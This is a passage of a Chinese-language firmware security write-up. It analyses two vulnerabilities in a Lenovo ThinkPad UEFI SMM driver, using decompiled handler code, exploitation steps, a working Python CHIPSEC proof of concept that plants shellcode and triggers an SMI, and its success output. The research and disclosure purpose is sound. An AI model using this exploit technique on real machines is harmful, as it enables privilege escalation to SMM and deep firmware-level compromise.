class="line"> </span><br><span class="line">        (v3 = gBS-&gt;LocateProtocol(</span><br><span class="line">            &amp;gEfiSmmCpuProtocolGuid,</span><br><span class="line">            <span class="number">0</span>i64,</span><br><span class="line">            &amp;gEfiSmmCpuProtocol), v3 &gt;= <span class="number">0</span>) &amp;&amp;</span><br><span class="line"> </span><br><span class="line">        (qword_250 = <span class="number">0xFFFFFFFF</span>i64, v3 = (*v9)(&amp;dword_240, &amp;qword_250), v3 &gt;= <span class="number">0</span>) &amp;&amp;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Register SMI handler, because SwSmiInputValue is -1 -- a unique</span></span><br><span class="line">        <span class="comment">// handler number will be assigned and returned by Register() function.</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        (v5 = <span class="number">0xFFFFFFFF</span>i64, v3 = gEfiSmmSwDispatchProtocol-&gt;Register(</span><br><span class="line">            gEfiSmmSwDispatchProtocol,</span><br><span class="line">            sub_3DC,</span><br><span class="line">            &amp;v5,</span><br><span class="line">            &amp;v7), v3 &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        v3 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在静态分析的过程中，我们无法确定SW SMI handler分配给<code>sub_3DC()</code>的编号，那么，为什么我认为该驱动程序导致了SW SMI handler 3崩溃呢？</p>
<p>答案很简单，看下面SMI handler代码中的第一个函数调用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">EFI_STATUS __fastcall <span class="title function_">sub_3DC</span><span class="params">(__int64 a1, _QWORD *a2, __int64 a3, __int64 a4)</span></span><br><span class="line">&#123;</span><br><span class="line">    _QWORD *v4; <span class="comment">// rbx@1</span></span><br><span class="line">    __int64 v5; <span class="comment">// rax@1</span></span><br><span class="line">    <span class="type">unsigned</span> __int16 v7; <span class="comment">// [sp+30h] [bp-18h]@3</span></span><br><span class="line">    <span class="type">int</span> v8; <span class="comment">// [sp+60h] [bp+18h]@5</span></span><br><span class="line">    <span class="type">int</span> v9; <span class="comment">// [sp+68h] [bp+20h]@1</span></span><br><span class="line"> </span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    v4 = a2;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Vulnerability is here:</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//SMI handler代码通过EFI_BOOT_SERVICES结构体中的地址调用LocateProtocol()</span></span><br><span class="line">    <span class="comment">//该结构体在runtime阶段可供操作系统访问</span></span><br><span class="line">    <span class="comment">//攻击者可以使用shellcode地址覆盖LocateProtocol()地址，并执行SMM代码</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    v5 = gBS-&gt;LocateProtocol(&amp;stru_270, <span class="number">0</span>i64, &amp;qword_BC0);</span><br><span class="line">    <span class="keyword">if</span> (v5 &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        gEfiSmmCpuProtocol-&gt;ReadSaveState(</span><br><span class="line">            gEfiSmmCpuProtocol,</span><br><span class="line">            <span class="number">2u</span>,</span><br><span class="line">            EFI_SMM_SAVE_STATE_REGISTER_ES,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            &amp;v9</span><br><span class="line">        );</span><br><span class="line"> </span><br><span class="line">        gEfiSmmCpuProtocol-&gt;ReadSaveState(</span><br><span class="line">            gEfiSmmCpuProtocol,</span><br><span class="line">            <span class="number">4u</span>,</span><br><span class="line">            EFI_SMM_SAVE_STATE_REGISTER_RBX,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            &amp;v7</span><br><span class="line">        );</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (*v4 == <span class="number">0xFFFFFFFF</span>i64)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// Another vulnerability is here:</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// 攻击者可将带有可控制地址的结构体作为参数传递给sub_93C()函数</span></span><br><span class="line">            <span class="comment">// 该结构体允许覆盖SMRAM中任意内存地址</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            sub_93C(v7);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        qword_BC0 = <span class="number">0</span>i64;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    gEfiSmmCpuProtocol-&gt;ReadSaveState(</span><br><span class="line">        gEfiSmmCpuProtocol,</span><br><span class="line">        <span class="number">4u</span>,</span><br><span class="line">        EFI_SMM_SAVE_STATE_REGISTER_RFLAGS,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        &amp;v8</span><br><span class="line">    );</span><br><span class="line"> </span><br><span class="line">    v8 &amp;= <span class="number">0xFFFFFFFA</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> gEfiSmmCpuProtocol-&gt;WriteSaveState(</span><br><span class="line">        gEfiSmmCpuProtocol,</span><br><span class="line">        <span class="number">4u</span>,</span><br><span class="line">        EFI_SMM_SAVE_STATE_REGISTER_RFLAGS,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        &amp;v8</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该代码调用<code>EFI_BOOT_SERVICES</code>的<code>LocateProtocol()</code>函数来使用GUID<code>2837C020-83F6-11DF-8395-0800200C9A66</code>获取指向某些未知OEM独有的UEFI DXE协议的指针。当你在DXE阶段代码中看到这样的调用时，这可能是正常的，但是<code>sub_3DC()</code>函数实际上是在SMM阶段的SMI管理部分中运行的——这意味着，UEFI规范只允许<code>sub_3DC()</code>使用<code>EFI_SMM_SYSTEM_TABLE </code>函数和SMM协议，而不允许使用<code>EFI_BOOT_SERVICES </code>函数或DXE协议。</p>
<p>这样的代码会在由操作系统生成的具有正确编号的SW SMI上崩溃 —— UEFI boot loader通过调用<code>ExitBootServices()</code>将执行权限转移给操作系统内核时，将释放<code>EFI_BOOT_SERVICES </code>结构体和所有DXE协议。因此，当平台从DXE阶段切换到runtime阶段时，攻击者可以覆盖<code>EFI_BOOT_SERVICES </code>结构体（其地址存储在有漏洞的SMM驱动程序的gBS全局变量中），以执行任意的SMM阶段代码，而不是原始的<code>LocateProtocol()</code>调用。</p>
<p>如下所示，<code>sub_3DC()</code>使用<code>EFI_SMM_CPU_PROTOCOL </code>的<code>ReadSavedState()</code>函数来读取操作系统控制的<code>RBX</code>值，并将其作为结构体指针传递给另一个函数<code>sub_93C()</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_93C</span><span class="params">(<span class="type">void</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 从SystemSmmAhciAspiLegacyRt UEFI SMM驱动的SMI handler中调用此函数。</span></span><br><span class="line">    <span class="comment">// 参数a1是指向某些结构体的指针，该指针可以被攻击者控制。</span></span><br><span class="line">    <span class="comment">// 因为sub_3DC()从操作系统的RBX寄存器中读取此值，该值在SMI调度期间已保存。</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="type">int</span> result; <span class="comment">// eax@1</span></span><br><span class="line">    __int64 v2; <span class="comment">// rdx@1</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 攻击者可以使用此代码覆盖SMRAM中在操作系统无法访问的任意内存地址</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    *((_BYTE *)a1 + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">    result = sub_5D8();</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (*(_BYTE *)(v2 + <span class="number">2</span>) &gt;= <span class="number">6u</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        *(_BYTE *)(v2 + <span class="number">1</span>) = <span class="number">-127</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (*(_BYTE *)v2 &gt;= <span class="number">9u</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 在下面被调用的所有函数也都可以接受攻击者可控的指针作为第一个参数</span></span><br><span class="line">    <span class="comment">// 它们的代码也可以用于覆盖SMRAM中任意物理内存</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span> (*(_BYTE *)v2)</span><br><span class="line">    &#123;     </span><br><span class="line">        <span class="keyword">switch</span> (*(_BYTE *)v2)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"> </span><br><span class="line">            result = sub_674(v2);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"> </span><br><span class="line">            result = sub_778(v2);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line"> </span><br><span class="line">            result = sub_818(v2);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line"> </span><br><span class="line">            result = sub_874(v2);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line"> </span><br><span class="line">            result = sub_6D8(v2);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> (*(_BYTE *)v2 != <span class="number">8</span>)</span><br><span class="line">            &#123;</span><br><span class="line">LABEL_4:</span><br><span class="line">                *(_BYTE *)(v2 + <span class="number">1</span>) = <span class="number">-128</span>;</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            result = sub_8D8(v2);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        result = sub_614(v2);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该漏洞也可以用于在SMM中执行任意代码。</p>
<p>我检查过的ThinkPad型号（X220，X230等）中都存在有漏洞的<code>SystemSmmAhciAspiLegacyRt </code>UEFI SMM驱动程序，这可能与联想生产的不同型号系列的产品有关。至于我的T450s，此驱动程序中的两个漏洞已在1.20版（<a target="_blank" rel="noopener" href="https://pcsupport.lenovo.com/sg/en/products/laptops-and-netbooks/thinkpad-t-series-laptops/thinkpad-t450s/downloads/DS102109">JBET55WW</a>）的最新固件中修复。即使该驱动程序的新版本仍值得关注，但我们所讨论的<code>sub_93C()</code>实际上已经实现了SMM与操作系统之间的通信通道。</p>
<p>在ThinkPad笔记本上，这些漏洞不允许攻击者感染SPI闪存中存储的平台固件：</p>
<ul>
<li>SPI闪存的某些区域受SPI保护区域（PRx）机制的保护</li>
<li>如前所述，新的TinkPad型号使用了Intel BootGuard。即使攻击者能够绕过PRx并修改固件image，但数字签名已损坏，CPU仍不会执行它的复位向量。</li>
</ul>
<p>然而，即使有这样的限制，从实用的角度来看，从ring0到SMM的提权仍然很有趣，它们的应用用例将在本文后面解释。</p>
<h1 id="SystemSmmAhciAspiLegacyRt-SMI-handler漏洞利用"><a href="#SystemSmmAhciAspiLegacyRt-SMI-handler漏洞利用" class="headerlink" title="SystemSmmAhciAspiLegacyRt SMI handler漏洞利用"></a>SystemSmmAhciAspiLegacyRt SMI handler漏洞利用</h1><p>我决定使用<code>sub_3DC()</code>内部的<code>LocateProtocol()</code>调用来利用发现的漏洞。</p>
<p>从<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Haswell_(microarchitecture)">Haswell微体系结构</a>开始，Intel CPU就提供了<code>MSR_SMM_FEATURE_CONTROL</code>模块特定的寄存器的<code>SMM_Code_Chk_En </code>控制位。”<a target="_blank" rel="noopener" href="http://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-vol-3c-part-3-manual.pdf">Volume 3C:System Programming Guide, Part 3</a>“中描述说：</p>
<blockquote>
<p>仅当<code>MSR_SMM_MCA_CAP[58] == 1</code>时，此控制位才可用。当设置为“0”（默认值）时，不会阻止任何逻辑处理器执行SMRR所定义范围之外的SMM代码。当设置为”1“时，程序中任何试图执行不在SMRR所定义范围内的SMM代码的逻辑处理器都将被声明为不可恢复的MCE。</p>
</blockquote>
<p>T450s的固件没有使用该功能，因此非常适合进行漏洞利用：无需关心shellcode的位置，SMRAM之外的任何物理内存页都是可执行的。</p>
<p>利用步骤如下：</p>
<ol>
<li>确定DXE阶段固件代码使用的<code>EFI_BOOT_SERVICES </code>结构体地址。通常，在同一计算机型号上运行的同一版本的固件，此地址在平台引导期间不会改变。</li>
<li>分配连续的物理内存块，然后将SMM shellcode复制进去。</li>
<li>在<code>EFI_BOOT_SERVICES</code> + 0x140的地址存储8个字节的shellcode物理地址，其中0x140是<code>LocateProtocol</code>字段的偏移量。Shellcode必须在RAX寄存器中返回-1(0xffffffffffffffff)，来绕过<code>sub_3DC()</code>中可能会导致平台崩溃的某些函数调用。</li>
<li>将 3 写入APMC I&#x2F;P端口B2h来触发必要的SW SMI，之后<code>sub_3DC()</code>将立即执行shellcode。</li>
<li>执行还原：在<code>EFI_BOOT_SERVICES</code> + 0x140等处还原原始内存内容。</li>
</ol>
<p>在特定目标机中查找<code>EFI_BOOT_SERVICES </code>地址最简单的方法就是——禁用安全启动（如有必要），然后引导到UEFI Shell并运行不带参数的<code>mem</code>命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Memory Address 00000000AB580F18 200 Bytes</span><br><span class="line">  AB580F18: 49 42 49 20 53 59 53 54-1F 00 02 00 78 00 00 00  *IBI SYST....x...*</span><br><span class="line">  AB580F28: 19 EA 64 44 00 00 00 00-18 30 B6 AA 00 00 00 00  *..dD.....0......*</span><br><span class="line">  AB580F38: 10 11 00 00 00 00 00 00-98 8A A3 A4 00 00 00 00  *................*</span><br><span class="line">  AB580F48: 70 22 32 AA 00 00 00 00-18 37 82 A3 00 00 00 00  *p&quot;2......7......*</span><br><span class="line">  ...</span><br><span class="line"> </span><br><span class="line">Valid EFI Header at Address 00000000AB580F18</span><br><span class="line">---------------------------------------------</span><br><span class="line">System: Table Structure size 00000078 revision 0002001F</span><br><span class="line">ConIn (00000000AA322270) ConOut (00000000A5155618) StdErr (00000000AA322670)</span><br><span class="line">Runtime Services 00000000AB580E18</span><br><span class="line">Boot Services    00000000A11A6610</span><br><span class="line">SAL System Table 0000000000000000</span><br><span class="line">ACPI Table       00000000ACDFE000</span><br><span class="line">ACPI 2.0 Table   00000000ACDFE014</span><br><span class="line">MPS Table        0000000000000000</span><br><span class="line">SMBIOS Table     00000000ACBFE000</span><br></pre></td></tr></table></figure>

<p>在获得了所需要的的信息后，就可以开始为该漏洞编写PoC了。和之前一样，我将使用python的CHIPSEC库作为硬件抽象API，该脚本可以在Windows和Linux上使用：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, os, struct</span><br><span class="line"><span class="keyword">from</span> hexdump <span class="keyword">import</span> hexdump</span><br><span class="line"> </span><br><span class="line"><span class="comment"># shellcode call counter address</span></span><br><span class="line">CNT_ADDR = <span class="number">0x00001010</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># SMM shellcode</span></span><br><span class="line">SC = <span class="string">&#x27;&#x27;</span>.join([ <span class="string">&#x27;\x48\xC7\xC0\x10\x10\x00\x00&#x27;</span>, <span class="comment"># mov  rax, CNT_ADDR</span></span><br><span class="line">               <span class="string">&#x27;\xFE\x00&#x27;</span>,                     <span class="comment"># inc  byte ptr [rax]</span></span><br><span class="line">               <span class="string">&#x27;\x48\x31\xC0&#x27;</span>,                 <span class="comment"># xor  rax, rax</span></span><br><span class="line">               <span class="string">&#x27;\x48\xFF\xC8&#x27;</span>,                 <span class="comment"># dec  rax</span></span><br><span class="line">               <span class="string">&#x27;\xC3&#x27;</span>,                         <span class="comment"># ret</span></span><br><span class="line">               <span class="string">&#x27;\x00&#x27;</span>                          <span class="comment"># db   0 ; call counter value</span></span><br><span class="line">             ])</span><br><span class="line"> </span><br><span class="line"><span class="comment"># shellcode address and size</span></span><br><span class="line">SC_ADDR = <span class="number">0x00001000</span></span><br><span class="line">SC_SIZE = <span class="number">0x10</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(SC) == SC_SIZE + <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Function address to overwrite:</span></span><br><span class="line"><span class="comment"># EFI_BOOT_SERVICES addr + LocateProtocol offset</span></span><br><span class="line">FN_ADDR = <span class="number">0xA11A6610</span> + <span class="number">0x140</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># SMI handler number</span></span><br><span class="line">SMI_NUM = <span class="number">3</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Chipsec</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">import</span> chipsec.chipset</span><br><span class="line">        <span class="keyword">import</span> chipsec.hal.physmem</span><br><span class="line">        <span class="keyword">import</span> chipsec.hal.interrupts</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># initialize CHIPSEC</span></span><br><span class="line">        self.cs = chipsec.chipset.cs()</span><br><span class="line">        self.cs.init(<span class="literal">None</span>, <span class="literal">True</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 获取所需类的实例</span></span><br><span class="line">        self.mem = chipsec.hal.physmem.Memory(self.cs)</span><br><span class="line">        self.ints = chipsec.hal.interrupts.Interrupts(self.cs)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># CHIPSEC没有用于quad words的物理内存的read/write方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read_physical_mem_qword</span>(<span class="params">self, addr</span>):</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> struct.unpack(<span class="string">&#x27;Q&#x27;</span>, self.mem.read_physical_mem(addr, <span class="number">8</span>))[<span class="number">0</span>]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">write_physical_mem_qword</span>(<span class="params">self, addr, val</span>):</span><br><span class="line"> </span><br><span class="line">        self.mem.write_physical_mem(addr, <span class="number">8</span>, struct.pack(<span class="string">&#x27;Q&#x27;</span>, val))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"> </span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">#initialize chipsec stuff</span></span><br><span class="line">    cs = Chipsec()</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Shellcode address is 0x%x, %d bytes length:&#x27;</span> % (SC_ADDR, SC_SIZE)</span><br><span class="line">    hexdump(SC)</span><br><span class="line">    <span class="built_in">print</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># backup shellcode memory contents</span></span><br><span class="line">    old_data = cs.mem.read_physical_mem(SC_ADDR, <span class="number">0x1000</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># write shellcode</span></span><br><span class="line">    cs.mem.write_physical_mem(SC_ADDR, SC_SIZE, SC)</span><br><span class="line">    cs.mem.write_physical_mem_byte(CNT_ADDR, <span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># read pointer value</span></span><br><span class="line">    old_val = cs.read_physical_mem_qword(FN_ADDR)</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Old value at 0x%x is 0x%x, overwriting with 0x%x&#x27;</span> % \</span><br><span class="line">          (FN_ADDR, old_val, SC_ADDR)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># write pointer value</span></span><br><span class="line">    cs.write_physical_mem_qword(FN_ADDR, SC_ADDR)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># fire SMI</span></span><br><span class="line">    cs.ints.send_SW_SMI(<span class="number">0</span>, SMI_NUM, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># read shellcode call counter</span></span><br><span class="line">    cnt = cs.mem.read_physical_mem_byte(CNT_ADDR)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># check for successful exploitation</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;SUCCESS: SMM shellcode was executed&#x27;</span> <span class="keyword">if</span> cnt &gt; <span class="number">0</span> <span class="keyword">else</span> \</span><br><span class="line">          <span class="string">&#x27;FAILS: Unable to execute SMM shellcode&#x27;</span></span><br><span class="line"> </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Performing memory cleanup...&#x27;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># restore overwritten memory</span></span><br><span class="line">    cs.mem.write_physical_mem(SC_ADDR, <span class="built_in">len</span>(old_data), old_data)</span><br><span class="line">    cs.write_physical_mem_qword(FN_ADDR, old_val)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> cnt &gt; <span class="number">0</span> <span class="keyword">else</span> -<span class="number">1</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> </span><br><span class="line">    exit(main())</span><br></pre></td></tr></table></figure>

<p>然后测试下该脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># python lenovo_SystemSmmAhciAspiLegacyRt_expl.py</span><br><span class="line"> </span><br><span class="line">****** Chipsec Linux Kernel module is licensed under GPL 2.0</span><br><span class="line"> </span><br><span class="line">Shellcode address is 0x1000, 16 bytes length:</span><br><span class="line">00000000: 48 C7 C0 10 10 00 00 FE  00 48 31 C0 48 FF C8 C3  H........H1.H...</span><br><span class="line"> </span><br><span class="line">Old value at 0xa11a6750 is 0x1000, overwriting with 0x1000</span><br><span class="line">SUCCESS: SMM shellcode was executed</span><br><span class="line">Performing memory cleanup...</span><br></pre></td></tr></table></figure>

